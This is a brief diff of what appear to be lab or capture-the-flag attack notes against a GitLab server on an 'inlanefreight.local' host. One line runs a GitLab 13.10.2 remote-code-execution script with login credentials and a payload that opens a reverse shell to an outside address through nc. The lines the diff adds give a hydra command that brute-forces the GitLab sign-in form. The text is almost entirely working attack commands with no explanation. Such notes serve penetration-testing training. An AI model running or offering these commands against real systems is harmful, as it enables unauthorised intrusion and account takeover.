@@ -35,3 +35,6 @@ get flag.txt
 
 
 python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+
+hydra -l admin -P passwords.txt <TARGET_IP> http-post-form \
+"/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid Login or password"
